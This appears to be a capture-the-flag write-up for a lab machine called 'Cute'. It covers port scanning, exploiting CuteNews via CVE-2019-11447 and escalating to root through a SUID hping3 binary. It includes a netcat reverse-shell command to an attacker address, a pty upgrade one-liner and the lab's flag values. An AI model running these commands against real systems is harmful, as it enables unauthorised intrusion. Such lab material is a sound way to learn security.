# Cute

IP Address
![[Pasted image 20220505202131.png]]
```text
192.168.1.191
```
# Open ports
```open ports
22/tcp  open  ssh      syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp  open  http     syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
88/tcp  open  http     syn-ack ttl 64 nginx 1.14.2
110/tcp open  pop3     syn-ack ttl 64 Courier pop3d
995/tcp open  ssl/pop3 syn-ack ttl 64 Courier pop3d
```

## Port 80
Apache 2.4.38
![[Pasted image 20220505202925.png]]


### Cute PHP/ Cute news

Looks like some kind of php sandbox
![[Pasted image 20220505203313.png]]

Software name
![[Pasted image 20220505203334.png]]

Captcha 
![[Pasted image 20220505203352.png]]

Login screen
![[Pasted image 20220505203423.png]]

Some migration page
![[Pasted image 20220505203520.png]]

Failed login; username disclosure
![[Pasted image 20220505203818.png]]

## CVE-2019-11447
[EDB-48800](https://www.exploit-db.com/exploits/48800) is an RCE exploit for Cute 2.1.2.

I had to remove `/CuteNews/` from all the URL strings. But then it gave this shell as `www-data`

![[Pasted image 20220506052027.png]]

### Get a better shell
```bash
nc -e /bin/bash 192.168.1.112 4444
```

```python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```


# User flag
Becasue of bad file permissions, I am able to get the user flag as `www-data`
```
dcb8189a0eaf7a690a67785a7299be60
```

![[Pasted image 20220506052448.png]]


# Linpeas findings
Internal only ports
![[Pasted image 20220506053133.png]]

No password sudo for `www-data`
![[Pasted image 20220506053210.png]]

# Privesc

`hping3` has the SUID bit set.
https://gtfobins.github.io/gtfobins/hping3/#suid

run the SUID binary
```bash
/usr/sbin/hping3
```

Break out into root shell
```bash
/bin/sh -p
```

![[Pasted image 20220506054458.png]]



# Root Flag
```
0b18032c2d06d9e738ede9bc24795ff2
```

![[Pasted image 20220506054605.png]]